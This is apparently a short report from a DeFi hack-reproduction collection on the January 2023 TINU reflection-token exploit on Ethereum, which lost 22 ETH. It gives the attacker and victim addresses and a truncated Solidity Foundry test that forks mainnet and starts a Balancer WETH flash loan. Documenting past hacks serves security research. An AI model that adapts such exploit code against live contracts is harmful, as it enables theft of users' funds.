# [?] - TINU - Reflection token

## Summary
Severity: Unknown
Chain: Ethereum
Component: TINU
Published: 2023-01-26
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/TINU_exp.sol
Type: defi-exploit-poc

## Details
Lost: 22 ETH
References:
- https://etherscan.io/tx/0x6200bf5c43c214caa1177c3676293442059b4f39eb5dbae6cfd4e6ad16305668
- https://twitter.com/libevm/status/1618731761894309889

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

// Total lost: 22 ETH
// Attacker: 0x14d8ada7a0ba91f59dc0cb97c8f44f1d177c2195
// Attack Contract: 0xdb2d869ac23715af204093e933f5eb57f2dc12a9
// Vulnerable Contract: 0x2d0e64b6bf13660a4c0de42a0b88144a7c10991f
// Attack Tx: https://phalcon.blocksec.com/tx/eth/0x6200bf5c43c214caa1177c3676293442059b4f39eb5dbae6cfd4e6ad16305668
//            https://etherscan.io/tx/0x6200bf5c43c214caa1177c3676293442059b4f39eb5dbae6cfd4e6ad16305668

// @Analysis
// https://twitter.com/libevm/status/1618731761894309889

contract TomInuExploit is Test {
    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    reflectiveERC20 private constant TINU = reflectiveERC20(0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F);

    IBalancerVault private constant balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IRouter private constant router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Pair private constant TINU_WETH = IUniswapV2Pair(0xb835752Feb00c278484c464b697e03b03C53E11B);

    function testHack() external {
        vm.createSelectFork("mainnet", 16_489_408);

        // flashloan WETH from Balancer
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 104.85 ether;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/TINU_exp.sol_
